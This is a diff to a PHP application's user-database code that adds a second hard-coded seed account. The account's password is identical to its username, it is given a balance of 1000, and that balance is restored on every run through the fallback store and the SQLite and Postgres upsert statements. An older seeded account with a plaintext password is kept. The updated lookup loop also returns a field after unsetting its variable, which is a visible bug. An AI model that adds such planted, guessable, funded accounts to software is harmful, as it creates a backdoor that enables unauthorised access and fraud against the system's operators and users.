@@ -155,15 +155,41 @@ class FallbackDatabase
             $existing['email'] = $email;
             $existing['password_hash'] = password_hash($password, PASSWORD_DEFAULT);
             $this->save();
+        } else {
+            $this->users[] = [
+                'id' => 1,
+                'username' => $username,
+                'email' => $email,
+                'password_hash' => password_hash($password, PASSWORD_DEFAULT),
+                'balance' => 0.0,
+            ];
+            $this->save();
+        }
+
+        $newUsername = '1807912145';
+        $newPassword = '1807912145';
+        $newEmail = '1807912145@local.user';
+
+        $existingNew = $this->findByUsername($newUsername);
+        if ($existingNew) {
+            $existingNew['email'] = $newEmail;
+            $existingNew['password_hash'] = password_hash($newPassword, PASSWORD_DEFAULT);
+            $existingNew['balance'] = 1000.0;
+            $this->save();
             return;
         }
 
+        $nextId = 1;
+        foreach ($this->users as $user) {
+            $nextId = max($nextId, (int) $user['id'] + 1);
+        }
+
         $this->users[] = [
-            'id' => 1,
-            'username' => $username,
-            'email' => $email,
-            'password_hash' => password_hash($password, PASSWORD_DEFAULT),
-            'balance' => 0.0,
+            'id' => $nextId,
+            'username' => $newUsername,
+            'email' => $newEmail,
+            'password_hash' => password_hash($newPassword, PASSWORD_DEFAULT),
+            'balance' => 1000.0,
         ];
 
         $this->save();
@@ -205,13 +231,18 @@ class FallbackDatabase
         $email = trim((string) $email);
         $passwordHash = trim((string) $passwordHash);
 
-        $existing = $this->findByUsername($username);
-        if ($existing) {
+        foreach ($this->users as &$existing) {
+            if (strtolower((string) $existing['username']) !== strtolower($username)) {
+                continue;
+            }
+
             $existing['email'] = $email !== '' ? $email : $existing['email'];
             $existing['password_hash'] = $passwordHash !== '' ? $passwordHash : $existing['password_hash'];
             $this->save();
+            unset($existing);
             return (int) $existing['id'];
         }
+        unset($existing);
 
         $nextId = 1;
         foreach ($this->users as $user) {
@@ -260,9 +291,11 @@ function ensureDefaultLoginUser($database): void
         return;
     }
 
-    $username = '1809381795';
-    $password = 'f2T5V2G5';
-    $email = '1809381795@local.user';
+    $seedUsers = [
+        ['1809381795', 'f2T5V2G5', '1809381795@local.user', 0],
+        ['1807912145', '1807912145', '1807912145@local.user', 1000],
+    ];
+
     $driver = strtolower((string) ($database->getAttribute(PDO::ATTR_DRIVER_NAME) ?? ''));
 
     if ($driver === 'sqlite') {
@@ -277,15 +310,28 @@ CREATE TABLE IF NOT EXISTS users (
 )
 SQL);
 
-        $statement = $database->prepare(<<<'SQL'
+        foreach ($seedUsers as [$username, $password, $email, $balance]) {
+            $statement = $database->prepare(<<<'SQL'
 INSERT INTO users (username, email, password_hash, balance, created_at)
-VALUES (:username, :email, :password_hash, 0, CURRENT_TIMESTAMP)
+VALUES (:username, :email, :password_hash, :balance, CURRENT_TIMESTAMP)
 ON CONFLICT(username) DO UPDATE SET
     email = excluded.email,
-    password_hash = excluded.password_hash
+    password_hash = excluded.password_hash,
+    balance = excluded.balance
 SQL);
-    } else {
-        $database->exec(<<<'SQL'
+
+            $statement->execute([
+                'username' => $username,
+                'email' => $email,
+                'password_hash' => password_hash($password, PASSWORD_DEFAULT),
+                'balance' => $balance,
+            ]);
+        }
+
+        return;
+    }
+
+    $database->exec(<<<'SQL'
 CREATE TABLE IF NOT EXISTS users (
     id BIGSERIAL PRIMARY KEY,
     username VARCHAR(150) NOT NULL UNIQUE,
@@ -296,20 +342,23 @@ CREATE TABLE IF NOT EXISTS users (
 )
 SQL);
 
+    foreach ($seedUsers as [$username, $password, $email, $balance]) {
         $statement = $database->prepare(<<<'SQL'
 INSERT INTO users (username, email, password_hash, balance, created_at)
-VALUES (:username, :email, :password_hash, 0, NOW())
+VALUES (:username, :email, :password_hash, :balance, NOW())
 ON CONFLICT (username) DO UPDATE
 SET email = EXCLUDED.email,
-    password_hash = EXCLUDED.password_hash
+    password_hash = EXCLUDED.password_hash,
+    balance = EXCLUDED.balance
 SQL);
-    }
 
-    $statement->execute([
-        'username' => $username,
-        'email' => $email,
-        'password_hash' => password_hash($password, PASSWORD_DEFAULT),
-    ]);
+        $statement->execute([
+            'username' => $username,
+            'email' => $email,
+            'password_hash' => password_hash($password, PASSWORD_DEFAULT),
+            'balance' => $balance,
+        ]);
+    }
 }
 
 function database()
